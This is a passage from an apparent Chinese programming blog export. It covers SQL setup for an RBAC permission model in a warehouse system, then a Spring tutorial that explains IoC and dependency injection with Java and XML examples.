VALUES (2, <span class="string">&#x27;不吃香菜&#x27;</span>, <span class="string">&#x27;222&#x27;</span>, 18, 1, <span class="string">&#x27;188&#x27;</span>);</span><br><span class="line">INSERT INTO `user` VALUES (3, <span class="string">&#x27;小王&#x27;</span>, <span class="string">&#x27;111&#x27;</span>, 20, 0, <span class="string">&#x27;999&#x27;</span>);</span><br><span class="line">INSERT INTO `user` VALUES (4, <span class="string">&#x27;刘总&#x27;</span>, <span class="string">&#x27;666&#x27;</span>, 21, 0, <span class="string">&#x27;666&#x27;</span>);</span><br><span class="line">INSERT INTO `user` VALUES (5, <span class="string">&#x27;小红&#x27;</span>, <span class="string">&#x27;333&#x27;</span>, 18, 1, <span class="string">&#x27;333&#x27;</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建role角色表</span></span><br><span class="line"></span><br><span class="line">DROP TABLE IF EXISTS `role`;</span><br><span class="line">CREATE TABLE `role`  (</span><br><span class="line">  `<span class="built_in">id</span>` bigint NOT NULL,</span><br><span class="line">  `name` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci NULL DEFAULT NULL,</span><br><span class="line">  `code` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci NULL DEFAULT NULL,</span><br><span class="line">  `create_time` datetime NULL DEFAULT NULL,</span><br><span class="line">  `update_time` datetime NULL DEFAULT NULL,</span><br><span class="line">  PRIMARY KEY (`<span class="built_in">id</span>`) USING BTREE</span><br><span class="line">) ENGINE = InnoDB CHARACTER SET = utf8mb4 COLLATE = utf8mb4_0900_ai_ci ROW_FORMAT = Dynamic;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 插入实验数据</span></span><br><span class="line"></span><br><span class="line">INSERT INTO `role` VALUES (1, <span class="string">&#x27;最高管理员&#x27;</span>, <span class="string">&#x27;ADMIN&#x27;</span>, NULL, NULL);</span><br><span class="line">INSERT INTO `role` VALUES (2, <span class="string">&#x27;仓库经理&#x27;</span>, <span class="string">&#x27;MANAGER&#x27;</span>, NULL, NULL);</span><br><span class="line">INSERT INTO `role` VALUES (3, <span class="string">&#x27;上架人员&#x27;</span>, <span class="string">&#x27;SHELF&#x27;</span>, NULL, NULL);</span><br><span class="line">INSERT INTO `role` VALUES (4, <span class="string">&#x27;出货人员&#x27;</span>, <span class="string">&#x27;SHIPMENT&#x27;</span>, NULL, NULL);</span><br><span class="line">INSERT INTO `role` VALUES (5, <span class="string">&#x27;财务人员&#x27;</span>, <span class="string">&#x27;MONEY&#x27;</span>, NULL, NULL);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 创建许可表</span></span><br><span class="line"></span><br><span class="line">DROP TABLE IF EXISTS `permmision`;</span><br><span class="line">CREATE TABLE `permmision`  (</span><br><span class="line">  `<span class="built_in">id</span>` bigint NOT NULL,</span><br><span class="line">  `name` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci NULL DEFAULT NULL,</span><br><span class="line">  `create_time` datetime NULL DEFAULT NULL,</span><br><span class="line">  `update_time` datetime NULL DEFAULT NULL,</span><br><span class="line">  PRIMARY KEY (`<span class="built_in">id</span>`) USING BTREE</span><br><span class="line">) ENGINE = InnoDB CHARACTER SET = utf8mb4 COLLATE = utf8mb4_0900_ai_ci ROW_FORMAT = Dynamic;</span><br><span class="line"></span><br><span class="line"><span class="comment">#插入实验数据</span></span><br><span class="line">INSERT INTO `permmision` VALUES (1, <span class="string">&#x27;新增员工&#x27;</span>, NULL, NULL);</span><br><span class="line">INSERT INTO `permmision` VALUES (2, <span class="string">&#x27;删除员工&#x27;</span>, NULL, NULL);</span><br><span class="line">INSERT INTO `permmision` VALUES (3, <span class="string">&#x27;修改员工&#x27;</span>, NULL, NULL);</span><br><span class="line">INSERT INTO `permmision` VALUES (4, <span class="string">&#x27;查看所有库存&#x27;</span>, NULL, NULL);</span><br><span class="line">INSERT INTO `permmision` VALUES (5, <span class="string">&#x27;上架商品&#x27;</span>, NULL, NULL);</span><br><span class="line">INSERT INTO `permmision` VALUES (6, <span class="string">&#x27;出货&#x27;</span>, NULL, NULL);</span><br><span class="line">INSERT INTO `permmision` VALUES (7, <span class="string">&#x27;报表&#x27;</span>, NULL, NULL);</span><br><span class="line">INSERT INTO `permmision` VALUES (8, <span class="string">&#x27;库存修改&#x27;</span>, NULL, NULL);</span><br><span class="line">INSERT INTO `permmision` VALUES (9, <span class="string">&#x27;商品入库&#x27;</span>, NULL, NULL);</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 用户和角色对应的关系表</span></span><br><span class="line"></span><br><span class="line">DROP TABLE IF EXISTS `map_user_role`;</span><br><span class="line">CREATE TABLE `map_user_role`  (</span><br><span class="line">  `role_id` bigint NULL DEFAULT NULL,</span><br><span class="line">  `user_id` bigint NULL DEFAULT NULL</span><br><span class="line">) ENGINE = InnoDB CHARACTER SET = utf8mb4 COLLATE = utf8mb4_0900_ai_ci ROW_FORMAT = Dynamic;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据对应的用户匹配对应的角色</span></span><br><span class="line"></span><br><span class="line">INSERT INTO `map_user_role` VALUES (1, 1);</span><br><span class="line">INSERT INTO `map_user_role` VALUES (2, 4);</span><br><span class="line">INSERT INTO `map_user_role` VALUES (3, 3);</span><br><span class="line">INSERT INTO `map_user_role` VALUES (4, 5);</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 创建角色对应的许可表</span></span><br><span class="line"></span><br><span class="line">DROP TABLE IF EXISTS `map_permmision_role`;</span><br><span class="line">CREATE TABLE `map_permmision_role`  (</span><br><span class="line">  `role_id` bigint NULL DEFAULT NULL,</span><br><span class="line">  `permission_id` bigint NULL DEFAULT NULL</span><br><span class="line">) ENGINE = InnoDB CHARACTER SET = utf8mb4 COLLATE = utf8mb4_0900_ai_ci ROW_FORMAT = Dynamic;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 不同角色对应不同的许可</span></span><br><span class="line"></span><br><span class="line">INSERT INTO `map_permmision_role` VALUES (1, 1);</span><br><span class="line">INSERT INTO `map_permmision_role` VALUES (1, 2);</span><br><span class="line">INSERT INTO `map_permmision_role` VALUES (1, 3);</span><br><span class="line">INSERT INTO `map_permmision_role` VALUES (1, 4);</span><br><span class="line">INSERT INTO `map_permmision_role` VALUES (1, 5);</span><br><span class="line">INSERT INTO `map_permmision_role` VALUES (1, 6);</span><br><span class="line">INSERT INTO `map_permmision_role` VALUES (1, 7);</span><br><span class="line">INSERT INTO `map_permmision_role` VALUES (1, 8);</span><br><span class="line">INSERT INTO `map_permmision_role` VALUES (1, 9);</span><br><span class="line">INSERT INTO `map_permmision_role` VALUES (2, 4);</span><br><span class="line">INSERT INTO `map_permmision_role` VALUES (2, 5);</span><br><span class="line">INSERT INTO `map_permmision_role` VALUES (2, 6);</span><br><span class="line">INSERT INTO `map_permmision_role` VALUES (2, 7);</span><br><span class="line">INSERT INTO `map_permmision_role` VALUES (2, 8);</span><br><span class="line">INSERT INTO `map_permmision_role` VALUES (2, 9);</span><br><span class="line">INSERT INTO `map_permmision_role` VALUES (3, 5);</span><br><span class="line">INSERT INTO `map_permmision_role` VALUES (3, 8);</span><br><span class="line">INSERT INTO `map_permmision_role` VALUES (3, 9);</span><br><span class="line">INSERT INTO `map_permmision_role` VALUES (4, 6);</span><br><span class="line">INSERT INTO `map_permmision_role` VALUES (5, 7);</span><br></pre></td></tr></table></figure>

<h2 id="电子商务系统"><a href="#电子商务系统" class="headerlink" title="电子商务系统"></a>电子商务系统</h2><p>在电商平台中，可能会有以下角色：</p>
<ol>
<li><p>平台系统管理员：拥有平台的最高权限</p>
</li>
<li><p>供应商管理员：可以管理自己的商店，上传商品，处理订单</p>
</li>
<li><p>客服人员：只能查看订单、处理退款、回复消费者消息</p>
</li>
<li><p>财务人员：只能查看店铺销售报表</p>
</li>
<li><p>一般消费者：可以购买一般商品</p>
</li>
<li><p>VIP消费者：除一般商品外，还可以购买指定会员的商品</p>
</li>
</ol>
<p>通过这种角色划分，平台可以精确控制众多用户的权限，确保每个人只能访问与职责相关的功能</p>
<h1 id="RBAC模型的准备和注意事项"><a href="#RBAC模型的准备和注意事项" class="headerlink" title="RBAC模型的准备和注意事项"></a>RBAC模型的准备和注意事项</h1><p>要在一个系统中搭出RBAC模型，前期需要建立几个机制：</p>
<ul>
<li><p>角色分析：仔细筛选组织业务流程和职责划分，确定需要哪些角色</p>
</li>
<li><p>权限定义：为每个角色定义所需的具体权限</p>
</li>
<li><p>角色分配：将用户分配到适当的角色</p>
</li>
</ul>
<p>在开发过程中，需要确认：</p>
<ul>
<li><p>架构设计：包括资料库设计、页面权限检查机制</p>
</li>
<li><p>测试验证：全面测试系统，确保每个角色只能看到指定权限</p>
</li>
</ul>
<p>事实上，以业务场景还需要确认：</p>
<ul>
<li><p>角色控管：随着系统复杂度或者客户数量增加，难免会不断增加角色，接下来就需要一个大表明确知道各个角色会有什么权限</p>
</li>
<li><p>客制权限：若A和B客户都有相同的角色，当A客户提升角色希望增加一个权限时，则要考虑会不会影响到B客户</p>
</li>
</ul>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>RBAC模型几乎是现在大型系统的权限管理方式，从仓库管理系统、银行系统、电商系统，都具备了良好的适应</p>
<p><font color = red>但RBAC模型也不是万能的，实际操作场景可能还需要配合其他控制模型来满足复杂的业务需求</font></p>
<table><tr><td bgcolor=yellow>
至此，所有实验已完成，这是作为小白的一个小小记录，如果有帮助到你，我很开心，大佬勿喷~
当然如果对此文有问题可随时联系我哦~~~
</td></tr></table>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>RBAC</tag>
      </tags>
  </entry>
  <entry>
    <title>Spring学习总结</title>
    <url>/2024/05/02/Spring%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="什么是Spring"><a href="#什么是Spring" class="headerlink" title="什么是Spring"></a>什么是Spring</h1><p><a href="https://spring.io/">Spring官网</a></p>
<h2 id="Spring定义"><a href="#Spring定义" class="headerlink" title="Spring定义"></a>Spring定义</h2><p><font size = 3>Spring是一款主流的Java EE 轻量级开源框架，目的是用于简化Java企业级引用的开发难度和开发周期。从简单性、可测试性和松耦合度的角度而言，任何Java应用都可以从Spring中受益。Spring框架提供自己提供功能外，还提供整合其他技术和框架的能力。Spring自诞生以来备受青睐，一直被广大开发人员作为Java企业级应用程序开发的首选。时至今日，Spring俨然成为了Java EE的代名词，成为了构建Java EE 应用的事实标准。<br></font></p>
<h2 id="Spring核心"><a href="#Spring核心" class="headerlink" title="Spring核心"></a>Spring核心</h2><p><font size = 3>Spring指的是Spring Framework，通常我们称之为Spring框架。Spring框架是一个分层的面向切面的Java应用程序的一站式解决框架，它是Spring技术栈的核心和基础，是为了解决企业级引用开发的复杂性而创建的。</p>
<p>Spring有两个核心模块：IoC和AOP。</p>
<p>Ioc：Inverse of Control的简写，为 控制反转，指把创建对象交给Spring进行管理。</p>
<p>AOP：Aspect Oriented Programming 的简写，为 面向切面编程。AOP用来封装多个类的公共行为，将那些与业务无关，却为业务模块共同调用的逻辑封装起来，减少系统的重复代码，降低模块间的耦合度。另外，AOP还解决一些系统层面上的问题，比如日志、事务、权限等。<br></font></p>
<h2 id="Spring框架的特点"><a href="#Spring框架的特点" class="headerlink" title="Spring框架的特点"></a>Spring框架的特点</h2><!-- <font size = 3> -->
<ul>
<li><p>控制反转：IoC，反转资源获取方向；把自己创建的资源、向环境索取资源变为环境将资源准备好，我们享受资源注入。</p>
</li>
<li><p>面向切面编程：AOP，在不修改源代码的基础上增强代码功能。</p>
</li>
<li><p>容器：Spring IoC是一个容器，因为它包含并管理组件对象的生命周期；组件享受到了容器化的管理，替程序员屏蔽了组件创建过程中的大量细节，极大降低了使用门槛，大幅度提高了开发效率。</p>
</li>
<li><p>一站式：在IOC和AOP的基础上可以整合各种企业应用的开源框架和优秀的第三方库，而且在Spring旗下的项目已经覆盖了广泛领域，很多方面的功能性需求可以在Spring Framework 的基础上全部使用Spring来实现。</p>
</li>
</ul>
<!-- </font> -->

<h1 id="IOC和DI"><a href="#IOC和DI" class="headerlink" title="IOC和DI"></a>IOC和DI</h1><h2 id="IOC-控制反转"><a href="#IOC-控制反转" class="headerlink" title="IOC:控制反转"></a>IOC:控制反转</h2><p>即控制权的转移，将我们创建对象的方式反转了,以前对象的创建是由我们开发人员自己维护,包括依赖关系也是自己注入。使用了spring之后，对象的创建以及依赖关系可以由spring完成创建以及注入，反转控制就是反转了对象的创建方式，从我们自己创建反转给了程序创建(spring)</p>
<ul>
<li>使用对象时，由主动new产生对象转换为由外部提供对象，此过程中对象创建控制权由程序转移到外部，此思想称为控制反转。通俗的讲就是“将new对象的权利交给Spring，我们从Spring中获取对象使用即可</li>
<li>业务层要用数据层的类对象，以前是自己new的</li>
<li>现在自己不new了，交给别人（外部）来创建对象</li>
<li>别人（外部）就反转控制了数据层对象的创建权</li>
</ul>
<blockquote>
<p>一个demo，方便大家理解到底什么是控制反转</p>
</blockquote>
<p><font size = 3>1.StudentMapper接口和StudentMapper实现类</font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 学生mapper</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">StudentMapper</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">insert</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// -------------------------------</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StudentMapperImpl</span> <span class="keyword">implements</span> <span class="title class_">StudentMapper</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">insert</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;新增一位学生通过Mapper&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><font size = 3>2.StudentService接口和StudentService实现类</font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// StudentService接口</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">StudentService</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">save</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ------------------------------</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StudentServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">StudentService</span> &#123;</span><br><span class="line">    <span class="comment">// 这里通过接口创建实现类</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">StudentMapper</span> <span class="variable">studentMapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StudentMapperImpl</span>();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">save</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;新增一位学生通过Service&quot;</span>);</span><br><span class="line">        studentMapper.insert();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><font size = 3>3.测试</font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StudentTest1</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">StudentServiceImpl</span> <span class="variable">studentService</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StudentServiceImpl</span>();;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        studentService.save();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 控制台打印结果</span></span><br><span class="line"><span class="comment">     * 新增一位学生通过Service</span></span><br><span class="line"><span class="comment">     * 新增一位学生通过Mapper</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<blockquote>
<p>这是我们最初写的方式，现在我们需要修改一下</p>
</blockquote>
<p><font size = 3>4.增加一个StudentMapper的实现类</font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StudentMapperImplTwo</span> <span class="keyword">implements</span> <span class="title class_">StudentMapper</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">insert</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;新增学生通过MapperTwo2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><font size = 3>5.此时如果我们需要使用MapperTwo2的话，就要修改原本的Service实现类</font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StudentServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">StudentService</span> &#123;</span><br><span class="line">    <span class="comment">// 这里通过接口创建实现类</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">StudentMapper</span> <span class="variable">studentMapperTwo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StudentMapperImplTwo</span>();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">save</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;新增一位学生通过Service&quot;</span>);</span><br><span class="line">        studentMapperTwo.insert();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><font size = 3>6.假设此时我们再增加一个mapper的实现类Three3</font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StudentMapperImplThree</span> <span class="keyword">implements</span> <span class="title class_">StudentMapper</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">insert</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;新增学生通过MapperThree3&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>那么我们要使用MapperThree, 又需要去service实现类里面修改对应的实现<br>假设我们的这种需求非常大,这种方式就根本不适用了需要修改大量代码,耦合性太高</p>
</blockquote>
<p><font size = 3>7.此时我们假如一个set方法</font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StudentServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">StudentService</span> &#123;</span><br><span class="line">    <span class="comment">// 这里通过接口创建实现类</span></span><br><span class="line">    <span class="comment">// private StudentMapper studentMapperTwo = new StudentMapperImplTwo();</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> StudentMapper studentMapper;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setStudentMapper</span><span class="params">(StudentMapper studentMapper)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.studentMapper = studentMapper;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">save</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;新增一位学生通过Service&quot;</span>);</span><br><span class="line">        studentMapper.insert();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><font size = 3>8.此时我们再进行测试</font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StudentTest1</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> StudentServiceImpl studentService;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        studentService = <span class="keyword">new</span> <span class="title class_">StudentServiceImpl</span>();</span><br><span class="line">        <span class="comment">// 此时在此修改即可</span></span><br><span class="line">        studentService.setStudentMapper(<span class="keyword">new</span> <span class="title class_">StudentMapperThree</span>());</span><br><span class="line">        studentService.save();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>通过上面的样例我们发现：<br>程序员是主动创建对象！控制权在程序员手上！<br>使用了set注入之后，程序不在具有主动性，而是变成了被动的接受对象！<br>这种思想 , 从本质上解决了问题 , 我们程序员不再去管理对象的创建了<br>更多的去关注业务的实现 . 耦合性大大降低 . 可以更加专注的在业务的实现上，这也就是IOC的原型!</p>
</blockquote>
<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/Spring/kzfz.png" alt="控制反转图"></p>
<blockquote>
<p>总的来说：使用对象时，在程序中不主动使用new产生对象，转换为由外部提供对象 !!! 这种实现思想就是Spring的一个核心概念</p>
</blockquote>
<h3 id="Spring和IOC之间的关系"><a href="#Spring和IOC之间的关系" class="headerlink" title="Spring和IOC之间的关系"></a>Spring和IOC之间的关系</h3><ul>
<li>Spring技术对IoC思想进行了实现</li>
<li>Spring提供了一个容器，称为IOC容器，用来充当IoC思想中的“外部”</li>
<li>IOC思想中的别人（外部）指的就是Spring的IOC容器</li>
</ul>
<h3 id="IOC容器的作用"><a href="#IOC容器的作用" class="headerlink" title="IOC容器的作用"></a>IOC容器的作用</h3><ul>
<li>IOC容器负责对象的创建、初始化等一系列工作，其中包含了数据层和业务层的类对象</li>
<li>被创建或被管理的对象在IOC容器中统称为Bean，IOC容器中放的就是一个个的Bean对象</li>
</ul>
<blockquote>
<p>敲黑板! ! !<br>当IOC容器中创建好service和mapper对象后，程序并不能正确执行，因为service运行需要依赖mapper对象， IOC容器中虽然有service和mapper对象，但是service对象和mapper对象没有任何关系，像这种在容器中建立对象与对象之间的绑定关系就要用到<font color = red>DI（依赖注入）</font></p>
</blockquote>
<h2 id="DI-Dependency-Injection-依赖注入"><a href="#DI-Dependency-Injection-依赖注入" class="headerlink" title="DI(Dependency Injection)依赖注入"></a>DI(Dependency Injection)依赖注入</h2><p>spring这个容器中，替你管理着一系列的类，前提是你需要将这些类交给spring容器进行管理，然后在你需要的时候，不是自己去定义，而是直接向spring容器索取，当spring容器知道你的需求之后，就会去它所管理的组件中进行查找，然后直接给你所需要的组件.<br>实现IOC思想需要DI做支持<br>注入方式:   1.set方式注入    2.构造方法注入   3.字段注入<br>注入类型:   1.值类型注入      2.引用类型注入</p>
<ul>
<li>在容器中建立bean与bean之间的依赖关系的整个过程，称为依赖注入</li>
<li>绑定对象与对象之间的依赖关系</li>
</ul>
<blockquote>
<p>使用Spring管理绑定对象与对象之间的关系demo</p>
</blockquote>
<p><font size = 3>1.导入Spring依赖</font></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">       <span class="comment">&lt;!--导入spring的坐标spring-context，对应版本是5.2.10.RELEASE--&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-context<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.2.10.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><font size = 3>2.创建StudentMapper接口与实现类</font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">StudentMapper</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">insert</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//-------------------</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StudentMapperImpl</span> <span class="keyword">implements</span> <span class="title class_">StudentMapper</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">insert</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;新增一位学生通过Mapper&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><font size = 3>3.创建StudentService接口与实现类</font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">StudentService</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">save</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"> <span class="comment">// ---------------------------------</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StudentServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">StudentService</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> StudentMapper studentMapper;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setStudentMapper</span><span class="params">(StudentMapper studentMapper)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.studentMapper = studentMapper;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">save</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;新增一位学生通过Service&quot;</span>);</span><br><span class="line">        studentMapper.insert();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><font size = 3>4.创建Spring的配置文件</font></p>
<blockquote>
<p>配置对应类作为Spring管理的bean对象 定义applicationContext.xml配置文件并配置</p>
</blockquote>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;studentMapper&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.lzjself.mapper.Impl.StudentMapperImpl&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;studentService&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.lzjself.service.Impl.StudentServiceImpl&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--配置service与mapper的关系</span></span><br><span class="line"><span class="comment">           property标签：表示配置当前bean的属性</span></span><br><span class="line"><span class="comment">           name属性：表示配置哪一个具体的属性,注意: 这里的name并不是属性 , 而是set方法后面的那部分 , 首字母小写</span></span><br><span class="line"><span class="comment">           ref属性：表示参照哪一个bean,引用另外一个bean , 不是用value 而是用 ref</span></span><br><span class="line"><span class="comment">           ref：引用Spring容器中创建好的对象</span></span><br><span class="line"><span class="comment">           value：具体的值，基本数据类型！</span></span><br><span class="line"><span class="comment">        --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;studentMapper&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;studentMapper&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>Spring配置文件就相当于一个容器。此容器中负责创建对象，并实现对象与对象之间的装配。</li>
<li>java中每一个类都是一个bean。所以上面的bean标签，就是在容器中创建一个java对象。</li>
<li>bean标签中的class属性，就是类名； id属性，就是对象名。</li>
